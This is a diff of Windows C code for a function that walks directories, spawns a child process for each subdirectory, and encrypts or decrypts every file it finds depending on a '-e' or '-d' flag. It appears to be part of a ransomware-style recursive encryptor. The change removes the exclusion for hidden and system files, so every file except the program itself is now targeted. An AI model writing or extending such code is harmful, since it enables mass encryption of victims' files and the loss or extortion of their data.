@@ -13,11 +13,10 @@ void iterate_dir(char *op, char *execp) {
 	PROCESS_INFORMATION pi;
 	char *namebuf;
 	int n;
-	
+
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
-	
 	if ((winhandle = FindFirstFile("*", &wd)) == INVALID_HANDLE_VALUE) {
 		perror("findfirstfile err");
 		exit(EXIT_FAILURE);
@@ -48,9 +47,11 @@ void iterate_dir(char *op, char *execp) {
 					fprintf(stderr, "createproc err %d\n", GetLastError());
 					exit(EXIT_FAILURE);
 				}
-				printf("%s%s\n", "Created child process for directory ", namebuf);
+				printf("Process %d moving to %s.\n", pi.dwProcessId, wd.cFileName);
 			}
-		} else if (!(wd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN || wd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(THISNAME, namebuf) == 1) {
+		} else if (strcmp(THISNAME, namebuf) == 0) {
+			//stupid bitwise
+		} else {
 			if (strcmp("-e", op) == 0)
 				fencrypt(wd.cFileName);
 			else if (strcmp("-d", op) == 0)
